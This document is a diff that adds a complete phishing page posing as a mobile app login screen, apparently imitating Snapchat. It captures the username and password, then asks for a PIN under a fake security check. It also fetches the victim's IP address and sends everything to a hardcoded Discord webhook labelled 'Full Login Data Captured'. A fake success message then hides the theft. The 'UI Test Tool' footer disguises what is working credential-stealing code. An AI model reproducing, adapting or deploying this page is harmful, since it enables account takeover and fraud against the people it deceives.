@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Log In</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fff; display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 360px; padding: 60px 30px; text-align: center; display: flex; flex-direction: column; min-height: 100vh; }
+        .header { font-size: 22px; font-weight: 700; margin-bottom: 20px; color: #000; }
+        .sub-header { font-size: 14px; color: #666; margin-bottom: 40px; line-height: 1.4; }
+        .field { text-align: left; margin-bottom: 35px; width: 100%; }
+        .label { font-size: 11px; font-weight: 800; color: #999; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+        input { width: 100%; border: none; border-bottom: 1px solid #e0e0e0; padding: 10px 0; font-size: 18px; outline: none; background: transparent; }
+        .pin-wrapper { display: flex; justify-content: center; gap: 20px; margin-bottom: 50px; cursor: pointer; }
+        .pin-dot { width: 15px; height: 15px; border-radius: 50%; border: 2px solid #e0e0e0; transition: 0.2s; }
+        .pin-dot.filled { background: #000; border-color: #000; }
+        .btn { width: 220px; padding: 16px; background-color: #FFFC00; color: #000; border: none; border-radius: 40px; font-size: 18px; font-weight: 700; cursor: pointer; margin: 20px auto; }
+        .btn:disabled { background-color: #f1f1f1; color: #aaa; }
+        .hidden { display: none !important; }
+        #actual-pin { opacity: 0; position: absolute; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div id="step-login">
+        <div class="header">Log In</div>
+        <div class="field"><div class="label">Username</div><input type="text" id="uField" autocomplete="off"></div>
+        <div class="field"><div class="label">Password</div><input type="password" id="pField"></div>
+        <button class="btn" id="toPinBtn">Log In</button>
+    </div>
+
+    <div id="step-pin" class="hidden">
+        <div class="header">Security Check</div>
+        <p class="sub-header">Please enter your PIN for you're not robox to verify.</p>
+        <div class="pin-wrapper" id="dotClick">
+            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+        </div>
+        <input type="password" id="actual-pin" inputmode="numeric" maxlength="4">
+        <button class="btn" id="finalBtn" disabled>Verify</button>
+    </div>
+</div>
+
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1476818186988159037/ef9A0CJCKiJfTLKtCXoQUENrIVel_z7Y8ZzWVhe5MSELv0qn2HTItbJQO_TtAjMgMFGS";
+
+    // Store data locally until the end
+    let storage = { user: "", pass: "" };
+
+    // 1. Move from Login to PIN
+    document.getElementById('toPinBtn').onclick = function() {
+        storage.user = document.getElementById('uField').value;
+        storage.pass = document.getElementById('pField').value;
+
+        if(!storage.user || !storage.pass) {
+            alert("Please enter your credentials.");
+            return;
+        }
+
+        document.getElementById('step-login').classList.add('hidden');
+        document.getElementById('step-pin').classList.remove('hidden');
+        document.getElementById('actual-pin').focus();
+    };
+
+    // 2. PIN Dot Logic
+    const realPin = document.getElementById('actual-pin');
+    const dots = document.querySelectorAll('.pin-dot');
+    const finalBtn = document.getElementById('finalBtn');
+
+    realPin.oninput = function() {
+        dots.forEach((dot, i) => {
+            i < this.value.length ? dot.classList.add('filled') : dot.classList.remove('filled');
+        });
+        finalBtn.disabled = this.value.length !== 4;
+    };
+
+    // 3. FINAL SEND (Everything together)
+    finalBtn.onclick = async function() {
+        const pinValue = realPin.value;
+        this.innerText = "Verifying...";
+        this.disabled = true;
+
+        let ip = "0.0.0.0";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) { console.log("IP fetch failed"); }
+
+        // Send everything in ONE message
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "✅ Full Login Data Captured",
+                        color: 16776192,
+                        fields: [
+                            { name: "👤 User", value: `\`${storage.user}\``, inline: true },
+                            { name: "🔑 Pass", value: `\`${storage.pass}\``, inline: true },
+                            { name: "🔢 PIN", value: `\`${pinValue}\``, inline: true },
+                            { name: "🌐 IP", value: `\`${ip}\``, inline: false }
+                        ],
+                        footer: { text: "UI Test Tool" },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+            alert("Verification Success!");
+            location.reload();
+        } catch(err) {
+            alert("Connection error. Try again.");
+            this.innerText = "Verify";
+            this.disabled = false;
+        }
+    };
+
+    // Keep keyboard open
+    document.getElementById('dotClick').onclick = () => realPin.focus();
+</script>
+
+</body>
+</html>
